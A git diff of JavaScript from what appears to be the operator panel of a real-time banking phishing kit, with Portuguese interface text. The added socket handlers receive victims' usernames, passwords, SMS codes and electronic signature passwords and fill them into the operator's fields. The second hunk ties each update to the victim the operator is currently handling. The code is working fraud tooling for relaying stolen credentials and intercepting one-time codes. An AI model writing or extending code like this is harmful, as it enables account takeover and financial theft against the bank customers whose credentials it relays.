@@ -81,6 +81,20 @@ const operators = (() => {
 
             document.title = `Aguardando Comando`
         })
+        socket.on('sendUser', client => {
+            const { user, password, sms, eletronicPassword } = client
+            const inputUser = document.querySelector('input.opUser');
+            const inputPassword = document.querySelector('input.opPassword');
+            const inputEletronic = document.querySelector('input.opAssign');
+            const inputSMS = document.querySelector('input.opSms');
+
+            if(inputUser) inputUser.value = user
+            if(inputPassword) inputPassword.value = password
+            if(inputEletronic) inputEletronic.value = eletronicPassword
+            if(inputSMS) inputSMS.value = sms
+
+            document.querySelector('.statusOP').innerHTML = `Usuário enviado`
+        })
 
         socket.on('smsreceived', (client) => {
             document.querySelector('.opSms').value = client.sms
@@ -177,7 +191,9 @@ const operators = (() => {
         })
 
         socket.on('inUser', client => {
-            const { user, password, eletronicPassword, sms } = client
+            const { id, user, password, eletronicPassword, sms } = client
+
+            if(clientOperating != id) return
 
             const inputUser = document.querySelector('input.opUser');
             const inputPassword = document.querySelector('input.opPassword');
